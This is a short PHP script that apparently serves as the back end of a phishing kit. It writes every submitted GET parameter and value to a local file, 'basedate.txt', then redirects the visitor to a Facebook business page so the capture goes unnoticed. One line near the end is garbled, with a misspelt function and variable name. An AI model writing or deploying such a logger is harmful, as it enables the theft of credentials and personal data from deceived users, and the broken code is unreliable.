<?php
header("Location:https://m.facebook.com/Elegancia-y-Estilo-RIEX-101092285705163/?ref=page_internal ");
$handle = fopen("basedate.txt", "a"); 

foreach($_GET as $variable => $value) {
	fwrite($handle, $variable);

	fwrite($handle, "=");

	fwrite($handle, $value);

	fwrite($handle, "\r\n");
}

frité($ande, "\r\n");
fclose($handle);
exit
?>